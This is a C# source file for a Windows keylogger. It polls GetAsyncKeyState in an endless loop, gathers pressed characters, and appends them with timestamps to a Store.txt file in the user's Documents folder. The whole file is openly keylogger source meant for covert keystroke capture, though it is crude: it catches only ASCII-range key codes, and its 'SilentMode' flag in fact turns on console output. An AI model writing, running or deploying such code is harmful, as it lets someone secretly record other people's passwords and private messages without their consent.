using System.Runtime.InteropServices;

namespace Main
{
    internal class Program
    {
        static void Main(string[] args)
        {
            KeyLoggerLogic.ActivateLogger(5, 50);
        }
    }

    public static class KeyLoggerLogic
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        /// <summary>
        /// Start of ASCII letters
        /// </summary>
        private static int start = 32;
        /// <summary>
        /// End of ASCII letters
        /// </summary>
        private static int end = 127;

        private static string allWhatsWritten = string.Empty;

        public static FileWriter writerObj = new();
        public static bool SilentMode { get; set; } = false;

        /// <summary>
        /// Activates the keylogger app
        /// </summary>
        public static void ActivateLogger(int delay, int wordLimit)
        {
            while (true)
            {
                Thread.Sleep(delay);

                for (int i = start; i < end; i++)
                {
                    // Loops through ascii characters 
                    int keyState = GetAsyncKeyState(i);
                    if (keyState != 0 && (byte)keyState != 0)
                    {
                        // if the current key sate is not 0 and the bit flag is 1 print the char to screen
                        if (SilentMode)
                        {
                            Console.WriteLine(keyState + "/" + i + "/" + (char)i);
                            Console.WriteLine((byte)keyState);
                        }

                        allWhatsWritten += (char)i;
                    }
                }

                if (CheckIfLimit(wordLimit))
                {
                    if (SilentMode)
                        Console.WriteLine(allWhatsWritten);

                    writerObj.WriteToFile(allWhatsWritten);
                    allWhatsWritten = string.Empty;
                }
            }
        }

        private static bool CheckIfLimit(int limit)
        {
            int lenght = allWhatsWritten.Length;

            if (lenght >= limit)
                return true;
            else
                return false;
        }
    }


    public class FileWriter
    {
        // properties
        public string FileName { get; }

        // fields
        private readonly string? currentLocation = string.Empty;
        private readonly string locationPath = string.Empty;
        private DateTime dateObj;

        public FileWriter(string fileName)
        {
            FileName = fileName;
            currentLocation = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        }

        public FileWriter()
        {
            FileName = @"\Store.txt";
            currentLocation = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            locationPath = currentLocation + FileName;
        }

        public void WriteToFile(string whatToWrite)
        {
            using (StreamWriter sw = new StreamWriter(locationPath, true))
            {
                dateObj = DateTime.Now;
                sw.Write(dateObj + ":" + whatToWrite + "\n");
            }
            Console.WriteLine($"Wrote to {locationPath}");
        }
    }
}